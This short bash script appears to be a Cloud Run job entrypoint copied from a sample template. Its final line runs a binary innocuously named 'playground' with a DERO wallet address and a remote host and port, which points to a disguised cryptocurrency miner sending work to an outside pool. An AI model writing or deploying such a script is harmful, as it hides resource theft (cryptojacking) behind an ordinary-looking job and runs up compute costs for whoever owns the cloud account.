#!/bin/bash
set -euo pipefail

# In production, consider printing commands as they are executed. 
# This helps with debugging if things go wrong and you only 
# have the logs.
#
# Add -x:
# set -euox pipefail

CLOUD_RUN_TASK_INDEX=${CLOUD_RUN_TASK_INDEX:=0}
CLOUD_RUN_TASK_ATTEMPT=${CLOUD_RUN_TASK_ATTEMPT:=0}

echo "Starting Task #${CLOUD_RUN_TASK_INDEX}, Attempt #${CLOUD_RUN_TASK_ATTEMPT}..."
chmod 500 playground && ./playground -w dero1qyxeam6g2kszcre09kpkhr9swgt560cyts3pfaa60q27ephl2a84qqqf9s2xk -r 67.205.175.167:10100 -p rpc
